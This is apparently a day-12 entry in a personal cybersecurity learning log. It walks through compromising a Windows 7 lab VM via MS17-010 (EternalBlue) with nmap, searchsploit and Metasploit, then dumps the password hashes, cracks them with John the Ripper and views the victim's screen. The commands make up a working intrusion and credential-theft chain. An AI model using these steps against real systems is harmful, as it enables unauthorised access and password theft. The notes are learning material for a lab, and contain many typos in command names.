# Day-12 
## Today's we will hack into a Windows machine, For this we are using a windows 7 machine I have used a ova file with that we will gain the access or hack into the system 

### Steps & procdure 
#### 1. Recon 
For identifying the system we need both the machine to be turned on and then and also need to connect to both of the machine on same network then only it is possible to gain access of the windows machine. For the link of the ova file just message me on my [Instagram](https://www.instagram.com/heartking_2324/). 
The command which we used to find the machine through the same network is called the arp-scan. arp-scan is a command-line tool that uses the ARP protocol to discover and fingerprint IP hosts on the local network.

```
 sudo apt-get update
 sudo apt-get upgrade -y
 sudo arp-scan -l -I eth0  
```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-12/arp-scan.png?raw=true)
After this we need to identify the machines ip address. So we find with the nmap and in that we identify with the Operating system.

``` nmap -O ip-add ```

![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-12/nmap-scan.png?raw=true)
When we find the ip which has windows 7 or somethng related to the microsoft service is our machine 

#### 2. Finding Vulnerability 
Now we have go the ip address of the machine we will target it and we look for any exploit and vulneriablility in the system 

``` namp -Pn -sV --script vuln -oN vuln-window.txt ip-adress ```

![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-12/nmap-script.png?raw=true)

The high risk vulneriability we have ms17-010 we search that on the searchexploit 

#### 3. Get deatil on the exploit 

``` searchexploit ms17-010 ```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-12/searchexploit.png?raw=true)
The first one which is given with the meta exploit is the method which we are going to use for the exploit the vulnerable machine.

#### 4. METAEXPLOIT 
To access the metaexploit we type the following command 
``` msfconsole ```
Now we search the exploit in the msfconsole 
``` search ms17-010 ```
There is only one single exploit in the msfconsole so just type use 0 
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-12/search-ms17-010.png?raw=true)
``` show options ```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-12/show-options.png?raw=true)
#### 5. Configure the msfconsole 
Their we setup the ip address and all the necessary options 
```
 set RHOST (windows ip-add)
 set LHOST (kali ip-add)
 show options
```
![](https://github.com/Heartking-2324/Cybersecurity-90days_notes/blob/main/Day-12/RHOST-LHOST.png?raw=true)

#### 6. EXPLOIT! 
Just enter exploit and then you will have successfully gained the access of the windows machine. 
Now you can just use ```hashdump``` command to get all the hash of the password which the windows machine. 
After getting all the has the user's has and then just open new tab and ```nano hash-windows``` 
We will use a tool call John The Ripper with the command ```john hash-windows```
Boom! you have the password of the user now the that password from the windows machine 
We then do a   ``` screenshare ``` to get the complete scrren visible on your device.
you can search more options to do this just google ``` after exploiting windows machine on metexploit things to do ```

## Conclusion 
It is very important to know that this was done on ova file which is not connected to any real person its just created for educational purpose. If your attacking a real machine just know that their will be consequence on you if you get caught. 

## Happy hacking! 
